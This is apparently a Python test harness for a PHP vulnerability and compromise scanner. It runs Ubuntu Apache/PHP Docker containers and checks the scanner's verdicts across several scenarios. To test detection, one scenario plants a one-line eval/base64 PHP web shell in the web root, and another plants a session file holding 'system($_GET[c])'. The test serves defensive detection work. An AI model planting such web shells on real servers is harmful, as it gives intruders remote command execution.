"""Host-side lab: --local (+ --ioc) inside real Ubuntu 24.04 Apache/mod_php containers, imported by the real CLI.

Scenarios (each must produce the stated verdict, mitigation and closure):
  mitigated   pre-fix 8.3.6-0maysync1, session.upload_progress.enabled=0 for Apache   -> VULNERABLE, OPEN_MITIGATED
  open        pre-fix 8.3.6-0maysync1, defaults                                        -> VULNERABLE, OPEN
  clean       backport 8.3.6-0ubuntu0.24.04.13, --ioc as root, nothing planted        -> PATCHED_BACKPORT, CLOSED_VERIFIED
  webshell    backport + eval(base64_decode($_POST..)) in the docroot + PHP in a sess_ file -> COMPROMISE_SUSPECTED
  child       backport + a request whose PHP runs `sleep` through a shell             -> COMPROMISE_SUSPECTED (worker child)
Images come from tests/oracle_lab/Dockerfile.ubuntu (built if missing). Run: python3 tests/host_lab.py
"""
import json, os, shutil, subprocess, sys, tempfile, time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
REG = os.environ.get("P2S_LAB_REGISTRY", "")
OLD, NEW = "8.3.6-0maysync1", "8.3.6-0ubuntu0.24.04.13"
INI = "/etc/php/8.3/apache2/conf.d/99-lab.ini"
FAIL = []
SHELL = "<?php @eval(base64_decode($_POST['x'])); ?>\n"


def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + (f"  ({detail})" if detail else ""), flush=True)
    if not cond:
        FAIL.append(name)


def sh(*a, check=True, **kw):
    return subprocess.run(a, capture_output=True, text=True, check=check, **kw)


def image(pkg):
    tag = f"p2s-lab/ubuntu-php:{pkg}"
    if sh("docker", "image", "inspect", tag, check=False).returncode:
        args = ["--build-arg", f"PHPPKG={pkg}"] + (["--build-arg", f"BASE={REG}ubuntu:24.04"] if REG else [])
        print(f"[*] building {tag}", flush=True)
        subprocess.run(["docker", "build", "-q", "-f", os.path.join(HERE, "oracle_lab", "Dockerfile.ubuntu"), "-t", tag, *args,
                        os.path.join(HERE, "oracle_lab")], check=True, stdout=subprocess.DEVNULL)
    return tag


SCENARIOS = [
    # name, package, ini, setup commands run in the container before collecting, expected (verdict, mitigation, closure)
    ("mitigated", OLD, "session.upload_progress.enabled=0\n", [], ("VULNERABLE", True, "OPEN_MITIGATED")),
    ("open", OLD, "", [], ("VULNERABLE", False, "OPEN")),
    ("clean", NEW, "", [], ("PATCHED_BACKPORT", False, "CLOSED_VERIFIED")),
    ("webshell", NEW, "", ["printf %s \"$SHELL\" > /var/www/html/up/cache.php",
                           "printf '%s' 'x|s:30:\"<?php system($_GET[c]); ?>\";' > /var/lib/php/sessions/sess_p2slab"],
     ("PATCHED_BACKPORT", False, "COMPROMISE_SUSPECTED")),
    ("child", NEW, "", ["(curl -s -m 20 http://127.0.0.1/slow.php >/dev/null &)", "sleep 2"],
     ("PATCHED_BACKPORT", False, "COMPROMISE_SUSPECTED")),
]


def main():
    if not shutil.which("docker") or sh("docker", "info", check=False).returncode:
        print("SKIP: docker not available")
        return 0
    work = tempfile.mkdtemp(prefix="p2s-host-lab-")
    started, out_dir = [], os.path.join(work, "local")
    os.makedirs(out_dir)
    try:
        for name, pkg, ini, setup, _ in SCENARIOS:
            doc = os.path.join(work, f"doc-{name}")
            os.makedirs(os.path.join(doc, "up"))
            open(os.path.join(doc, "index.php"), "w").write("<?php echo 'lab';\n")
            open(os.path.join(doc, "slow.php"), "w").write("<?php shell_exec('sleep 15'); echo 'done';\n")
            iniff = os.path.join(work, f"{name}.ini")
            open(iniff, "w").write(ini)
            cname = f"p2s-host-{name}-{os.getpid()}"
            # docroot copied in (not mounted) so planted files are ordinary files on the container's filesystem
            sh("docker", "run", "-d", "--rm", "--name", cname, "-v", f"{iniff}:{INI}:ro", "-v", f"{ROOT}:/src:ro",
               "-v", f"{out_dir}:/out", "-e", f"SHELL={SHELL}", image(pkg))
            started.append(cname)
            sh("docker", "cp", f"{doc}/.", f"{cname}:/var/www/html/")
            sh("docker", "exec", cname, "chown", "-R", "www-data", "/var/www/html")
            for _ in range(40):
                if sh("docker", "exec", cname, "sh", "-c", "pgrep -x apache2 >/dev/null", check=False).returncode == 0:
                    break
                time.sleep(0.5)
            time.sleep(1)
            if any("curl" in c for c in setup):
                sh("docker", "exec", cname, "sh", "-c", "command -v curl >/dev/null || (apt-get update -qq && apt-get install -y -qq curl) >/dev/null 2>&1")
            for c in setup:
                sh("docker", "exec", cname, "bash", "-c", c)
            p = sh("docker", "exec", cname, "python3", "/src/php2shell_scan.py", "--local", f"/out/{name}.json", "--ioc",
                   "--ioc-since", "2026-01-01", check=False, timeout=300)
            check(f"{name}: --local --ioc ran in the container", p.returncode == 0, p.stderr[-300:])
        ips = {n: sh("docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", c).stdout.strip()
               for (n, *_), c in zip(SCENARIOS, started)}
        out = os.path.join(work, "out")
        # report built from the --local files only: a one-port scan of nothing reachable keeps the run honest about coverage
        p = subprocess.run([sys.executable, os.path.join(ROOT, "php2shell_scan.py"), "-t", "127.0.0.1", "--ports", "1",
                            "--scope", "127.0.0.1", "172.16.0.0/12", "--authorized", "--import-local", out_dir, "-o", out,
                            "--formats", "json,html,xlsx,csv"], capture_output=True, text=True, timeout=300)
        assets = {a["host"]: a for a in json.load(open(os.path.join(out, "assets.json")))["assets"]}
        for name, _, _, _, (verdict, mitigated, closure) in SCENARIOS:
            a = assets.get(ips[name], {})
            v = a.get("verified") or {}
            check(f"{name}: verdict {verdict}, mitigation {mitigated}, closure {closure}",
                  v.get("verdict") == verdict and (v.get("mitigation") or {}).get("state") is mitigated and a.get("closure") == closure,
                  f"got {v.get('verdict')} / {(v.get('mitigation') or {}).get('state')} / {a.get('closure')}; {v.get('summary', '')[:200]}")
        ws = (assets.get(ips["webshell"], {}).get("verified") or {}).get("ioc") or {}
        check("webshell: both the docroot shell and the session payload are named",
              any(p.endswith("/up/cache.php") for p in ws.get("shells", [])) and any("sess_p2slab" in p for p in ws.get("sessions", [])),
              f"shells={ws.get('shells')} sessions={ws.get('sessions')}")
        ch = (assets.get(ips["child"], {}).get("verified") or {}).get("ioc") or {}
        check("child: the shell spawned by the Apache worker is named", any("sleep" in c for c in ch.get("children", [])), str(ch.get("children")))
        cl = (assets.get(ips["clean"], {}).get("verified") or {}).get("ioc") or {}
        check("clean: IoC ran as root, recent files hashed, no content copied",
              cl.get("priv") == "root" and cl.get("recent") and all(len(r["sha256"]) == 64 for r in cl["recent"])
              and "lab" not in json.dumps(cl), f"priv={cl.get('priv')} recent={len(cl.get('recent', []))}")
        html = open(os.path.join(out, "report.html"), encoding="utf-8").read()
        check("report: closure section and compromise headline", "Remediation closure" in html and "compromise indicators" in html, "")
        check("exit code 2 (compromise suspected / open)", p.returncode in (2, 3), f"rc={p.returncode}")
    finally:
        for c in started:
            sh("docker", "stop", "-t", "1", c, check=False)
        shutil.rmtree(work, ignore_errors=True)
    print("\n" + ("ALL PASSED" if not FAIL else f"{len(FAIL)} FAILED: {FAIL}"))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
